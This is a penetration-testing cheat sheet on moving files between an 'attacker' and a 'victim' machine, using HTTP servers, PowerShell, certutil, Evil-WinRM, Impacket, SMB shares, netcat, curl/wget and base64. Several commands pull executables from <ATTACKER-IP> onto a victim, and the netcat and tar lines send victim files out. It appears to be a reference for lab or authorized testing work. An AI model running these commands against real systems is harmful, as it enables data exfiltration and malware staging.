File Transfers

HTTP

Start a simple HTTP server on the attacker machine.

python3 -m http.server <ATTACKER-PORT>

Download a file from the attacker using PowerShell WebClient.

(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe','C:\Temp\file.exe')

Download a file using Invoke-WebRequest.

Invoke-WebRequest http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe -OutFile file.exe

Download a file using certutil.

certutil -urlcache -split -f http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe

Evil-WinRM and Impacket

Download a file from the victim.

download file.exe C:\Temp\file.exe

Upload a file to the victim.

upload file.exe C:\Temp\file.exe

Download a file using an Impacket interactive shell.

lget file.exe

Upload a file using an Impacket interactive shell.

lput file.exe

SMB

Create an SMB share on the attacker machine.

impacket-smbserver share . -smb2support -username user -password pass

Map the SMB share on the victim machine.

net use Z: \\<ATTACKER-IP>\share /user:user pass

Copy a file from the SMB share.

copy Z:\file.exe C:\Temp\file.exe

Netcat

Receive a file on the attacker machine.

nc -lvp <ATTACKER-PORT> > file.exe

Send a file from the victim machine.

nc <ATTACKER-IP> <ATTACKER-PORT> < file.exe

Send a compressed directory.

tar czvf - folder | nc <ATTACKER-IP> <ATTACKER-PORT>

Wget and Curl

Download a file using wget.

wget http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe

Download a file using curl.

curl -O http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe

Download a file using curl on Windows.

curl http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe -o C:\Temp\file.exe

Base64

Encode a file using Base64.

base64 file.exe

Decode a Base64 string back to a file.

echo BASE64_STRING | base64 -d > file.exe
